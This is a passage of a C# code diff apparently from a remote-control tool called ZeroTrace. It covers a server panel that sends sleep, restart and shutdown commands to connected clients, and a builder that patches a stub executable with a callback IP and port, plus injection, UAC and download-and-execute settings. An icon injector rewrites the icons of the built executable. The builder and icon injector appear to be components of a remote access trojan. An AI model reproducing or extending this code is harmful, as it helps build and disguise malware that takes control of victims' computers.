+            connectionsManagementMenu.AddItem(connectionsSleepItem);
+            connectionsManagementMenu.AddItem(connectionsHibernateItem);
+            connectionsManagementMenu.AddItem(connectionsRestartItem);
+            connectionsManagementMenu.AddItem(connectionsShutdownItem);
+
+            connectionsPopupMenu.AddItem(connectionsAdministrationMenu);
+            connectionsPopupMenu.AddItem(connectionsNetworkingMenu);
+            connectionsPopupMenu.AddItem(connectionsPluginsMenu);
+            connectionsPopupMenu.AddItem(connectionsManagementMenu);
+
+        }
+
+        private void DisposeConnectionMenuIcons()
+        {
+            DisposeSvgImages(connectionMenuIconImages);
+        }
+
+        private bool ShowConnectionConfirmation(string action)
+        {
+            return MessageBox.Show(
+                "Are you sure you want to " + action.ToLowerInvariant() + "?",
+                action,
+                MessageBoxButtons.OKCancel,
+                MessageBoxIcon.Warning,
+                MessageBoxDefaultButton.Button2) == DialogResult.OK;
+        }
+
+        private void SendSelectedConnectionCommand(string command)
+        {
+            List<string> connectionIds = new List<string>();
+            int[] selectedRows = gridView == null ? new int[0] : gridView.GetSelectedRows();
+
+            foreach (int rowHandle in selectedRows)
+            {
+                if (rowHandle < 0)
+                    continue;
+
+                string connectionId = Convert.ToString(gridView.GetRowCellValue(rowHandle, "ConnectionId"));
+                if (!string.IsNullOrWhiteSpace(connectionId) && !connectionIds.Contains(connectionId))
+                    connectionIds.Add(connectionId);
+            }
+
+            foreach (string connectionId in connectionIds)
+            {
+                TcpClient client = null;
+                lock (connectionStateLock)
+                {
+                    connectedClients.TryGetValue(connectionId, out client);
+                }
+
+                if (client == null)
+                {
+                    LogFinalCommandResult(command, "failed: connection unavailable", LogType.Error);
+                    continue;
+                }
+
+                try
+                {
+                    NetworkStream stream = client.GetStream();
+                    byte[] request = Encoding.UTF8.GetBytes("CMD:" + command + "\n");
+                    stream.Write(request, 0, request.Length);
+                    stream.Flush();
+                    TrackPendingCommand(connectionId, command);
+                }
+                catch (IOException)
+                {
+                    LogFinalCommandResult(command, "failed: send error", LogType.Error);
+                }
+                catch (ObjectDisposedException)
+                {
+                    LogFinalCommandResult(command, "failed: connection closed", LogType.Error);
+                }
+                catch (SocketException)
+                {
+                    LogFinalCommandResult(command, "failed: socket error", LogType.Error);
+                }
+            }
+        }
+
+        private static string CommandLabel(string command)
+        {
+            switch ((command ?? string.Empty).Trim().ToUpperInvariant())
+            {
+                case "SLEEP": return "Sleep";
+                case "HIBERNATE": return "Hibernate";
+                case "RESTART": return "Restart";
+                case "SHUTDOWN": return "Shutdown";
+                case "RECONNECT": return "Restart connection";
+                case "CLOSE": return "Close connection";
+                default: return command ?? "Command";
+            }
+        }
+
+        private void TrackPendingCommand(string connectionId, string command)
+        {
+            string key = connectionId + "|" + command.ToUpperInvariant();
+            lock (connectionStateLock)
+            {
+                pendingCommands[key] = new PendingCommand
+                {
+                    ConnectionId = connectionId,
+                    Command = command.ToUpperInvariant(),
+                    SentAtUtc = DateTime.UtcNow
+                };
+            }
+
+            Task.Run(delegate
+            {
+                Thread.Sleep(4000);
+                lock (connectionStateLock)
+                {
+                    if (!pendingCommands.Remove(key))
+                        return;
+                }
+                LogFinalCommandResult(command, "ACK not received", LogType.Warning);
+            });
+        }
+
+        private void LogFinalCommandResult(string command, string outcome, LogType type)
+        {
+            string label = CommandLabel(command);
+            LogServerEvent(label + " command " + (outcome ?? string.Empty).Trim(), type);
+        }
+
+        private void CompletePendingCommand(string connectionId, string command, bool acknowledged)
+        {
+            string key = connectionId + "|" + command.ToUpperInvariant();
+            bool wasPending;
+            lock (connectionStateLock)
+            {
+                wasPending = pendingCommands.Remove(key);
+            }
+
+            // A timeout or disconnect may already have produced the final result.
+            // Ignore any late acknowledgement so Server Logs contains one row per command.
+            if (!wasPending)
+                return;
+
+            LogFinalCommandResult(command, acknowledged ? "succeeded" : "failed: agent returned an error",
+                acknowledged ? LogType.Success : LogType.Error);
+        }
+
+        private void ReportPendingCommandsOnDisconnect(string connectionId)
+        {
+            List<PendingCommand> pending = new List<PendingCommand>();
+            lock (connectionStateLock)
+            {
+                List<string> removeKeys = pendingCommands.Keys
+                    .Where(key => key.StartsWith(connectionId + "|", StringComparison.Ordinal))
+                    .ToList();
+                foreach (string key in removeKeys)
+                {
+                    pending.Add(pendingCommands[key]);
+                    pendingCommands.Remove(key);
+                }
+            }
+
+            foreach (PendingCommand command in pending)
+                LogFinalCommandResult(command.Command, "ACK not received", LogType.Warning);
+        }
+
+        private void ShowAdministrationDialog(string selectedAction)
+        {
+            const int DialogWidth = 620;
+            const int DialogHeight = 344;
+            Color window = Color.FromArgb(35, 37, 38);
+            Color titleBar = Color.FromArgb(29, 31, 32);
+            Color surface = Color.FromArgb(43, 45, 46);
+            Color field = Color.FromArgb(31, 33, 34);
+            Color border = Color.FromArgb(70, 74, 74);
+            Color text = Color.FromArgb(239, 242, 241);
+            Color muted = Color.FromArgb(164, 171, 168);
+            Color accent = SidebarAccentColor;
+
+            using (Form dialog = new Form())
+            {
+                dialog.Name = "AdministrationDialog";
+                dialog.Text = "Administration";
+                dialog.StartPosition = FormStartPosition.Manual;
+                dialog.FormBorderStyle = FormBorderStyle.None;
+                dialog.MinimizeBox = false;
+                dialog.MaximizeBox = false;
+                dialog.ShowInTaskbar = false;
+                dialog.ClientSize = new Size(DialogWidth, DialogHeight);
+                dialog.BackColor = window;
+                dialog.ForeColor = text;
+                dialog.Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point);
+                dialog.KeyPreview = true;
+
+                using (System.Drawing.Drawing2D.GraphicsPath path = CreateRoundedRectanglePath(new Rectangle(0, 0, DialogWidth, DialogHeight), 12))
+                    dialog.Region = new Region(path);
+
+                Panel titlePanel = new Panel
+                {
+                    Dock = DockStyle.Top,
+                    Height = 58,
+                    BackColor = titleBar
+                };
+                titlePanel.Paint += delegate(object sender, PaintEventArgs args)
+                {
+                    using (Pen accentPen = new Pen(accent, 1.5f))
+                        args.Graphics.DrawLine(accentPen, new Point(0, 0), new Point(0, titlePanel.Height));
+                };
+                Label title = new Label
+                {
+                    Text = "Administration",
+                    AutoSize = true,
+                    Font = new Font("Segoe UI Semibold", 12.5F, FontStyle.Bold, GraphicsUnit.Point),
+                    ForeColor = text,
+                    Location = new Point(22, 15)
+                };
+                Label close = new Label
+                {
+                    AutoSize = false,
+                    Size = new Size(46, 46),
+                    Text = "×",
+                    TextAlign = ContentAlignment.MiddleCenter,
+                    Font = new Font("Segoe UI Light", 19F, FontStyle.Regular, GraphicsUnit.Point),
+                    ForeColor = muted,
+                    Cursor = Cursors.Hand,
+                    Anchor = AnchorStyles.Top | AnchorStyles.Right,
+                    Location = new Point(DialogWidth - 55, 8)
+                };
+                close.MouseEnter += delegate { close.ForeColor = text; close.BackColor = Color.FromArgb(55, 58, 58); };
+                close.MouseLeave += delegate { close.ForeColor = muted; close.BackColor = Color.Transparent; };
+                close.Click += delegate { dialog.DialogResult = DialogResult.Cancel; dialog.Close(); };
+
+                titlePanel.Controls.Add(title);
+                titlePanel.Controls.Add(close);
+
+                // The custom title bar also provides natural mouse dragging.
+                Point dragOffset = Point.Empty;
+                titlePanel.MouseDown += delegate(object sender, MouseEventArgs args)
+                {
+                    if (args.Button == MouseButtons.Left) dragOffset = args.Location;
+                };
+                titlePanel.MouseMove += delegate(object sender, MouseEventArgs args)
+                {
+                    if (args.Button == MouseButtons.Left)
+                    {
+                        Point cursor = Cursor.Position;
+                        dialog.Location = new Point(cursor.X - dragOffset.X - titlePanel.Left, cursor.Y - dragOffset.Y - titlePanel.Top);
+                    }
+                };
+
+                Label fileLabel = new Label
+                {
+                    Text = "File",
+                    AutoSize = true,
+                    Font = new Font("Segoe UI Semibold", 9F, FontStyle.Bold, GraphicsUnit.Point),
+                    ForeColor = text,
+                    Location = new Point(28, 78)
+                };
+                Label fileHint = new Label
+                {
+                    Text = "Select the local file to use for this administration action.",
+                    AutoSize = true,
+                    Font = new Font("Segoe UI", 8.25F, FontStyle.Regular, GraphicsUnit.Point),
+                    ForeColor = muted,
+                    Location = new Point(28, 97)
+                };
+
+                Panel filePanel = new Panel
+                {
+                    Location = new Point(28, 124),
+                    Size = new Size(564, 44),
+                    BackColor = field
+                };
+                filePanel.Paint += delegate(object sender, PaintEventArgs args)
+                {
+                    using (Pen pen = new Pen(border, 1))
+                        args.Graphics.DrawRectangle(pen, 0, 0, filePanel.Width - 1, filePanel.Height - 1);
+                };
+                TextBox filePath = new TextBox
+                {
+                    BorderStyle = BorderStyle.None,
+                    Location = new Point(13, 12),
+                    Width = 400,
+                    Height = 20,
+                    ReadOnly = true,
+                    BackColor = field,
+                    ForeColor = text,
+                    Font = new Font("Segoe UI", 9F, FontStyle.Regular, GraphicsUnit.Point),
+                    TabStop = false
+                };
+                Button browse = new Button
+                {
+                    Text = "Browse",
+                    FlatStyle = FlatStyle.Flat,
+                    Location = new Point(457, 6),
+                    Size = new Size(98, 32),
+                    BackColor = Color.FromArgb(49, 50, 51),
+                    ForeColor = Color.White,
+                    Font = new Font("Segoe UI Semibold", 8.75F, FontStyle.Bold, GraphicsUnit.Point),
+                    Cursor = Cursors.Hand
+                };
+                browse.FlatAppearance.BorderColor = Color.FromArgb(93, 99, 99);
+                browse.FlatAppearance.MouseOverBackColor = Color.FromArgb(58, 61, 62);
+                browse.FlatAppearance.MouseDownBackColor = Color.FromArgb(64, 67, 68);
+                browse.Click += delegate
+                {
+                    using (OpenFileDialog chooser = new OpenFileDialog { Title = "Select a file", CheckFileExists = true, Multiselect = false })
+                    {
+                        if (chooser.ShowDialog(dialog) == DialogResult.OK) filePath.Text = chooser.FileName;
+                    }
+                };
+                filePanel.Controls.Add(filePath);
+                filePanel.Controls.Add(browse);
+
+                Label actionLabel = new Label
+                {
+                    Text = "Administration action",
+                    AutoSize = true,
+                    Font = new Font("Segoe UI Semibold", 9F, FontStyle.Bold, GraphicsUnit.Point),
+                    ForeColor = text,
+                    Location = new Point(28, 186)
+                };
+                Label actionHint = new Label
+                {
+                    Text = "Select one option. The highlighted choice is the one submitted by OK.",
+                    AutoSize = true,
+                    Font = new Font("Segoe UI", 8.25F, FontStyle.Regular, GraphicsUnit.Point),
+                    ForeColor = muted,
+                    Location = new Point(28, 205)
+                };
+
+                RadioButton one = CreateAdministrationRadio("Download [ One ]", new Point(28, 235), surface, border, accent, text);
+                RadioButton two = CreateAdministrationRadio("Download [ Two ]", new Point(218, 235), surface, border, accent, text);
+                RadioButton update = CreateAdministrationRadio("Download and Update", new Point(408, 235), surface, border, accent, text);
+                one.Checked = selectedAction == "Download [ One ]";
+                two.Checked = selectedAction == "Download [ Two ]";
+                update.Checked = selectedAction == "Download and Update";
+
+                Button cancel = new Button
+                {
+                    Text = "Cancel",
+                    DialogResult = DialogResult.Cancel,
+                    FlatStyle = FlatStyle.Flat,
+                    Location = new Point(404, 294),
+                    Size = new Size(88, 34),
+                    BackColor = Color.FromArgb(48, 50, 51),
+                    ForeColor = text,
+                    Font = new Font("Segoe UI Semibold", 9F, FontStyle.Bold, GraphicsUnit.Point),
+                    Cursor = Cursors.Hand
+                };
+                cancel.FlatAppearance.BorderColor = border;
+                cancel.FlatAppearance.MouseOverBackColor = Color.FromArgb(57, 60, 60);
+                cancel.FlatAppearance.MouseDownBackColor = Color.FromArgb(64, 67, 67);
+
+                Button ok = new Button
+                {
+                    Text = "OK",
+                    FlatStyle = FlatStyle.Flat,
+                    Location = new Point(502, 294),
+                    Size = new Size(90, 34),
+                    BackColor = accent,
+                    ForeColor = Color.White,
+                    Font = new Font("Segoe UI Semibold", 9F, FontStyle.Bold, GraphicsUnit.Point),
+                    Cursor = Cursors.Hand
+                };
+                ok.FlatAppearance.BorderSize = 0;
+                ok.FlatAppearance.MouseOverBackColor = accent;
+                ok.FlatAppearance.MouseDownBackColor = accent;
+                ok.Click += delegate { /* Intentionally a no-op for now. */ };
+
+                dialog.AcceptButton = ok;
+                dialog.CancelButton = cancel;
+                dialog.Controls.Add(titlePanel);
+                dialog.Controls.Add(fileLabel);
+                dialog.Controls.Add(fileHint);
+                dialog.Controls.Add(filePanel);
+                dialog.Controls.Add(actionLabel);
+                dialog.Controls.Add(actionHint);
+                dialog.Controls.Add(one);
+                dialog.Controls.Add(two);
+                dialog.Controls.Add(update);
+                dialog.Controls.Add(cancel);
+                dialog.Controls.Add(ok);
+
+                // Center the modal over the complete main GUI client area (including
+                // the sidebar). This keeps the dialog visually attached to its owner
+                // while remaining correct when the owner sits on any monitor.
+                Rectangle ownerClient = RectangleToScreen(ClientRectangle);
+                int dialogX = ownerClient.Left + Math.Max(0, (ownerClient.Width - DialogWidth) / 2);
+                int dialogY = ownerClient.Top + Math.Max(0, (ownerClient.Height - DialogHeight) / 2);
+                dialog.Location = new Point(dialogX, dialogY);
+
+                if (string.Equals(Environment.GetEnvironmentVariable("ZTSEC_CI_SMOKE"), "1", StringComparison.Ordinal))
+                {
+                    dialog.Shown += delegate
+                    {
+                        try
+                        {
+                            string markerPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ci-administration-dialog-opened.flag");
+                            File.WriteAllText(markerPath,
+                                "OPENED|" + DateTime.UtcNow.ToString("O") + "|Administration|" + selectedAction + "|DownloadOneChecked=" + one.Checked.ToString());
+                        }
+                        catch (Exception ex)
+                        {
+                            LogToMonitor("CI administration dialog verification failed: " + ex.Message, LogType.Error);
+                        }
+                    };
+                }
+
+                dialog.ShowDialog(this);
+            }
+        }
+
+        private static RadioButton CreateAdministrationRadio(string caption, Point location, Color background, Color border, Color accent, Color text)
+        {
+            RadioButton radio = new RadioButton
+            {
+                Text = string.Empty,
+                Tag = caption,
+                Location = location,
+                Size = new Size(174, 45),
+                BackColor = background,
+                ForeColor = text,
+                Font = new Font("Segoe UI", 8.75F, FontStyle.Regular, GraphicsUnit.Point),
+                FlatStyle = FlatStyle.Flat,
+                Appearance = System.Windows.Forms.Appearance.Normal,
+                Cursor = Cursors.Hand,
+                UseVisualStyleBackColor = false
+            };
+            radio.FlatAppearance.BorderSize = 0;
+            radio.Paint += delegate(object sender, PaintEventArgs e)
+            {
+                RadioButton rb = (RadioButton)sender;
+                e.Graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
+                using (SolidBrush bg = new SolidBrush(rb.BackColor))
+                    e.Graphics.FillRectangle(bg, rb.ClientRectangle);
+
+                int dotCenterX = 14;
+                int dotCenterY = rb.ClientSize.Height / 2;
+                Rectangle ring = new Rectangle(dotCenterX - 8, dotCenterY - 8, 16, 16);
+                using (Pen ringPen = new Pen(Color.FromArgb(195, 201, 198), 1.4f))
+                    e.Graphics.DrawEllipse(ringPen, ring);
+                if (rb.Checked)
+                {
+                    using (SolidBrush dotBrush = new SolidBrush(accent))
+                        e.Graphics.FillEllipse(dotBrush, new Rectangle(dotCenterX - 4, dotCenterY - 4, 8, 8));
+                }
+
+                string label = Convert.ToString(rb.Tag);
+                using (SolidBrush textBrush = new SolidBrush(rb.ForeColor))
+                    e.Graphics.DrawString(label, rb.Font, textBrush, new PointF(29, dotCenterY - rb.Font.Height / 2f + 1));
+            };
+            radio.CheckedChanged += delegate { radio.Invalidate(); };
+            radio.MouseEnter += delegate { radio.BackColor = Color.FromArgb(49, 51, 52); radio.Invalidate(); };
+            radio.MouseLeave += delegate { radio.BackColor = background; radio.Invalidate(); };
+            return radio;
+        }
+
+        private static System.Drawing.Drawing2D.GraphicsPath CreateRoundedRectanglePath(Rectangle bounds, int radius)
+        {
+            int diameter = radius * 2;
+            System.Drawing.Drawing2D.GraphicsPath path = new System.Drawing.Drawing2D.GraphicsPath();
+            path.AddArc(bounds.Left, bounds.Top, diameter, diameter, 180, 90);
+            path.AddArc(bounds.Right - diameter, bounds.Top, diameter, diameter, 270, 90);
+            path.AddArc(bounds.Right - diameter, bounds.Bottom - diameter, diameter, diameter, 0, 90);
+            path.AddArc(bounds.Left, bounds.Bottom - diameter, diameter, diameter, 90, 90);
+            path.CloseFigure();
+            return path;
+        }
+
+        private static void ApplyContextMenuToControlTree(Control root, ContextMenuStrip menu)
+        {
+            if (root == null || menu == null)
+                return;
+
+            root.ContextMenuStrip = menu;
+            foreach (Control child in root.Controls)
+                ApplyContextMenuToControlTree(child, menu);
+        }
+
+        private void connectionsContextMenu_Opening(object sender, System.ComponentModel.CancelEventArgs e)
+        {
+            contextMenuRowHandle = -1;
+            contextMenuFieldName = string.Empty;
+
+            Control source = connectionsContextMenu.SourceControl;
+            if (source != null && IsDescendantOf(source, gridControl1))
+            {
+                Point clientPoint = gridControl1.PointToClient(Control.MousePosition);
+                DevExpress.XtraGrid.Views.Grid.ViewInfo.GridHitInfo hitInfo =
+                    gridView.CalcHitInfo(clientPoint);
+
+                if (hitInfo.InRow && hitInfo.RowHandle >= 0)
+                {
+                    contextMenuRowHandle = hitInfo.RowHandle;
+                    contextMenuFieldName = hitInfo.Column != null ? hitInfo.Column.FieldName : string.Empty;
+
+                    // Right-click selects the row under the cursor. Preserve an
+                    // existing multi-selection when right-clicking inside it.
+                    if (!gridView.IsRowSelected(hitInfo.RowHandle))
+                    {
+                        gridView.ClearSelection();
+                        gridView.SelectRow(hitInfo.RowHandle);
+                    }
+                    gridView.FocusedRowHandle = hitInfo.RowHandle;
+                }
+            }
+
+            // The visible menu contains only the four requested top-level submenus.
+            // The popup performs native measurement, hover rendering and submenu traversal.
+            e.Cancel = true;
+            connectionsPopupMenu.ShowPopup(Control.MousePosition);
+
+            // Give DevExpress a UI turn to create/render the native popup, then verify
+            // the real PopupMenu reports itself open. CI uses this application-owned
+            // marker instead of guessing the popup window class (which is not stable
+            // across DevExpress versions/skins).
+            if (string.Equals(Environment.GetEnvironmentVariable("ZTSEC_CI_SMOKE"), "1", StringComparison.Ordinal))
+            {
+                BeginInvoke(new Action(MarkCiConnectionsPopupIfOpen));
+            }
+        }
+
+        private void MarkCiConnectionsPopupIfOpen()
+        {
+            if (!string.Equals(Environment.GetEnvironmentVariable("ZTSEC_CI_SMOKE"), "1", StringComparison.Ordinal))
+                return;
+
+            try
+            {
+                if (connectionsPopupMenu == null || !connectionsPopupMenu.Opened)
+                    return;
+
+                string[] expected = { "Administration", "Networking", "Plugins", "Management" };
+                string[] actual = connectionsPopupMenu.ItemLinks
+                    .Cast<DevExpress.XtraBars.BarItemLink>()
+                    .Select(link => link.Item != null ? link.Item.Caption : string.Empty)
+                    .ToArray();
+
+                if (actual.Length != expected.Length || !actual.SequenceEqual(expected, StringComparer.Ordinal))
+                    return;
+
+                string markerPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ci-connections-menu-opened.flag");
+                string payload = "OPENED|" + DateTime.UtcNow.ToString("O") + "|" + string.Join("|", actual);
+                File.WriteAllText(markerPath, payload);
+            }
+            catch (Exception ex)
+            {
+                LogToMonitor("CI context-menu verification failed: " + ex.Message, LogType.Error);
+            }
+        }
+
+        private static bool IsDescendantOf(Control child, Control ancestor)
+        {
+            Control current = child;
+            while (current != null)
+            {
+                if (current == ancestor)
+                    return true;
+                current = current.Parent;
+            }
+
+            return false;
+        }
+
+        private void accordionControlElement2_Click(object sender, EventArgs e)
+        {
+            xtraTabPage1.TabControl.SelectedTabPageIndex = 0;
+            accordionControl1.SelectedElement = accordionControlElement2;
+        }
+
+        private void accordionControlElement3_Click(object sender, EventArgs e)
+        {
+            xtraTabPage1.TabControl.SelectedTabPageIndex = 1;
+            accordionControl1.SelectedElement = accordionControlElement3;
+        }
+
+        private void accordionControlElement4_Click(object sender, EventArgs e)
+        {
+            xtraTabPage1.TabControl.SelectedTabPageIndex = 2;
+        }
+
+        private void accordionControlElement6_Click(object sender, EventArgs e)
+        {
+            xtraTabPage1.TabControl.SelectedTabPageIndex = 4;
+            accordionControl1.SelectedElement = accordionControlElement6;
+        }
+
+        private void accordionControlElement7_Click(object sender, EventArgs e)
+        {
+            xtraTabPage1.TabControl.SelectedTabPageIndex = 5;
+            accordionControl1.SelectedElement = accordionControlElement7;
+        }
+
+        private void accordionControlElement13_Click(object sender, EventArgs e)
+        {
+            xtraTabPage1.TabControl.SelectedTabPageIndex = 8;
+            accordionControl1.SelectedElement = accordionControlElement13;
+        }
+
+
+
+    }
+
+}
+
+
+namespace ZeroTrace.Builder
+{
+
+
+    internal sealed class Build
+    {
+
+
+
+        private static AssemblyDefinition ReadStub(string stubPath)
+        {
+            if (!File.Exists(stubPath))
+                throw new FileNotFoundException("Stub file not found.", stubPath);
+
+            return AssemblyDefinition.ReadAssembly(stubPath);
+        }
+
+        private static void WriteStub(AssemblyDefinition definition, string outputPath)
+        {
+            definition.Write(outputPath);
+        }
+
+
+
+
+
+        private static void UpdateResource(string resourceName, string newContent, AssemblyDefinition assembly)
+        {
+            // Find the existing resource by name
+            var existingResource = assembly.MainModule.Resources.OfType<EmbeddedResource>()
+                                    .FirstOrDefault(r => r.Name.Equals(resourceName));
+
+            if (existingResource != null)
+            {
+                // Remove the existing resource
+                assembly.MainModule.Resources.Remove(existingResource);
+            }
+
+            // Add the new resource
+            var newResource = new EmbeddedResource(resourceName, Mono.Cecil.ManifestResourceAttributes.Public, Encoding.UTF8.GetBytes(newContent));
+            assembly.MainModule.Resources.Add(newResource);
+        }
+
+        public static void UpdateIPAndPort(string newIP, string newPort, string injValue, string chrome, string downloadexecute, AssemblyDefinition assembly)
+        {
+            // Remove and add the IP and Port resources
+            UpdateResource("ZeroTraceOfficialStub.Resources.ip.txt", newIP, assembly);
+            UpdateResource("ZeroTraceOfficialStub.Resources.port.txt", newPort, assembly);
+
+            // Add the injection resource
+            UpdateResource("ZeroTraceOfficialStub.Resources.inj.txt", injValue, assembly);
+
+            UpdateResource("ZeroTraceOfficialStub.Resources.uac.txt", chrome, assembly);
+
+            UpdateResource("ZeroTraceOfficialStub.Resources.downloadexecute.txt", downloadexecute, assembly);
+
+        }
+
+
+        //public static void ModifyObfuscatedAssembly(string newIP, string newPort, string outputPath)
+        //{
+        //    try
+        //    {
+        //        string stubPath = Environment.CurrentDirectory + "\\Stub\\DestinyClientObf.exe";
+
+        //        Console.WriteLine(stubPath);
+        //        Console.ReadLine();
+        //        // Read the stub assembly
+        //        var assembly = ReadStub(stubPath);
+
+        //        // Update the IP and Port resources
+        //        UpdateIPAndPort(newIP, newPort, assembly);
+
+        //        // Write the modified assembly to a file
+        //        WriteStub(assembly, outputPath);
+        //    }
+        //    catch (Exception ex)
+        //    {
+        //        throw new Exception($"Failed to modify assembly: {ex.Message}");
+        //    }
+        //}
+
+
+        public static void ModifyAndSaveAssembly(string newIP, string newPort, string injValue, string chrome, string downloadexecute, string outputPath)
+        {
+            try
+            {
+                string stubPath = Environment.CurrentDirectory + "\\Stub\\ZeroStub.exe";
+                Console.WriteLine(stubPath);
+                Console.ReadLine();
+                // Read the stub assembly
+                var assembly = ReadStub(stubPath);
+                // Update the IP, Port and injection setting resources
+                UpdateIPAndPort(newIP, newPort, injValue, chrome,  downloadexecute, assembly);
+                // Write the modified assembly to a file
+                WriteStub(assembly, outputPath);
+            }
+            catch (Exception ex)
+            {
+                throw new Exception($"Failed to modify assembly: {ex.Message}");
+            }
+        }
+    }
+
+}
+namespace Server.Helper
+{
+    public static class IconInjector
+    {
+        
+
+        [SuppressUnmanagedCodeSecurity()]
+        private class NativeMethods
+        {
+            [DllImport("kernel32")]
+            public static extern IntPtr BeginUpdateResource(string fileName,
+                [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);
+
+            [DllImport("kernel32")]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language,
+                [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data, int dataSize);
+
+            [DllImport("kernel32")]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
+        }
+
+        // The first structure in an ICO file lets us know how many images are in the file.
+        [StructLayout(LayoutKind.Sequential)]
+        private struct ICONDIR
+        {
+            // Reserved, must be 0
+            public ushort Reserved;
+            // Resource type, 1 for icons.
+            public ushort Type;
+            // How many images.
+            public ushort Count;
+            // The native structure has an array of ICONDIRENTRYs as a final field.
+        }
+
+        // Each ICONDIRENTRY describes one icon stored in the ico file. The offset says where the icon image data
+        // starts in the file. The other fields give the information required to turn that image data into a valid
+        // bitmap.
+        [StructLayout(LayoutKind.Sequential)]
+        private struct ICONDIRENTRY
+        {
+            /// <summary>
+            /// The width, in pixels, of the image.
+            /// </summary>
+            public byte Width;
+            /// <summary>
+            /// The height, in pixels, of the image.
+            /// </summary>
+            public byte Height;
+            /// <summary>
+            /// The number of colors in the image; (0 if >= 8bpp)
+            /// </summary>
+            public byte ColorCount;
+            /// <summary>
+            /// Reserved (must be 0).
+            /// </summary>
+            public byte Reserved;
+            /// <summary>
+            /// Color planes.
+            /// </summary>
+            public ushort Planes;
+            /// <summary>
+            /// Bits per pixel.
+            /// </summary>
+            public ushort BitCount;
+            /// <summary>
+            /// The length, in bytes, of the pixel data.
+            /// </summary>
+            public int BytesInRes;
+            /// <summary>
+            /// The offset in the file where the pixel data starts.
+            /// </summary>
+            public int ImageOffset;
+        }
+
+        // Each image is stored in the file as an ICONIMAGE structure:
+        //typdef struct
+        //{
+        //   BITMAPINFOHEADER   icHeader;      // DIB header
+        //   RGBQUAD         icColors[1];   // Color table
+        //   BYTE            icXOR[1];      // DIB bits for XOR mask
+        //   BYTE            icAND[1];      // DIB bits for AND mask
+        //} ICONIMAGE, *LPICONIMAGE;
+
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct BITMAPINFOHEADER
+        {
+            public uint Size;
+            public int Width;
+            public int Height;
+            public ushort Planes;
+            public ushort BitCount;
+            public uint Compression;
+            public uint SizeImage;
+            public int XPelsPerMeter;
+            public int YPelsPerMeter;
+            public uint ClrUsed;
+            public uint ClrImportant;
+        }
+
+        // The icon in an exe/dll file is stored in a very similar structure:
+        [StructLayout(LayoutKind.Sequential, Pack = 2)]
+        private struct GRPICONDIRENTRY
+        {
+            public byte Width;
+            public byte Height;
+            public byte ColorCount;
+            public byte Reserved;
+            public ushort Planes;
+            public ushort BitCount;
+            public int BytesInRes;
+            public ushort ID;
+        }
+
+        public static void InjectIcon(string exeFileName, string iconFileName)
+        {
+            InjectIcon(exeFileName, iconFileName, 1, 1);
+        }
+
+        public static void InjectIcon(string exeFileName, string iconFileName, uint iconGroupID, uint iconBaseID)
+        {
+            const uint RT_ICON = 3u;
+            const uint RT_GROUP_ICON = 14u;
+            IconFile iconFile = IconFile.FromFile(iconFileName);
+            var hUpdate = NativeMethods.BeginUpdateResource(exeFileName, false);
+            var data = iconFile.CreateIconGroupData(iconBaseID);
+            NativeMethods.UpdateResource(hUpdate, new IntPtr(RT_GROUP_ICON), new IntPtr(iconGroupID), 0, data,
+                data.Length);
+            for (int i = 0; i <= iconFile.ImageCount - 1; i++)
+            {
+                var image = iconFile.ImageData(i);
+                NativeMethods.UpdateResource(hUpdate, new IntPtr(RT_ICON), new IntPtr(iconBaseID + i), 0, image,
+                    image.Length);
+            }
+            NativeMethods.EndUpdateResource(hUpdate, false);
+        }
+
+        private class IconFile
+        {
+            private ICONDIR iconDir = new ICONDIR();
+            private ICONDIRENTRY[] iconEntry;
+
+            private byte[][] iconImage;
+
+            public int ImageCount
+            {
+                get { return iconDir.Count; }
+            }
+
+            public byte[] ImageData(int index)
+            {
+                return iconImage[index];
+            }
+
+            public static IconFile FromFile(string filename)
+            {
+                IconFile instance = new IconFile();
+                // Read all the bytes from the file.
+                byte[] fileBytes = System.IO.File.ReadAllBytes(filename);
+                // First struct is an ICONDIR
+                // Pin the bytes from the file in memory so that we can read them.
+                // If we didn't pin them then they could move around (e.g. when the
+                // garbage collector compacts the heap)
+                GCHandle pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned);
+                // Read the ICONDIR
+                instance.iconDir = (ICONDIR)Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject(), typeof(ICONDIR));
+                // which tells us how many images are in the ico file. For each image, there's a ICONDIRENTRY, and associated pixel data.
+                instance.iconEntry = new ICONDIRENTRY[instance.iconDir.Count];
+                instance.iconImage = new byte[instance.iconDir.Count][];
+                // The first ICONDIRENTRY will be immediately after the ICONDIR, so the offset to it is the size of ICONDIR
+                int offset = Marshal.SizeOf(instance.iconDir);
+                // After reading an ICONDIRENTRY we step forward by the size of an ICONDIRENTRY            
+                var iconDirEntryType = typeof(ICONDIRENTRY);
+                var size = Marshal.SizeOf(iconDirEntryType);
+                for (int i = 0; i <= instance.iconDir.Count - 1; i++)
+                {
+                    // Grab the structure.
+                    var entry =
+                        (ICONDIRENTRY)
+                            Marshal.PtrToStructure(new IntPtr(pinnedBytes.AddrOfPinnedObject().ToInt64() + offset),
+                                iconDirEntryType);
+                    instance.iconEntry[i] = entry;
+                    // Grab the associated pixel data.
+                    instance.iconImage[i] = new byte[entry.BytesInRes];
+                    Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage[i], 0, entry.BytesInRes);
+                    offset += size;
+                }
+                pinnedBytes.Free();
+                return instance;
+            }
+
+            public byte[] CreateIconGroupData(uint iconBaseID)
+            {
+                // This will store the memory version of the icon.
+                int sizeOfIconGroupData = Marshal.SizeOf(typeof(ICONDIR)) +
+                                          Marshal.SizeOf(typeof(GRPICONDIRENTRY)) * ImageCount;
+                byte[] data = new byte[sizeOfIconGroupData];
+                var pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned);
+                Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject(), false);
+                var offset = Marshal.SizeOf(iconDir);
+                for (int i = 0; i <= ImageCount - 1; i++)
+                {
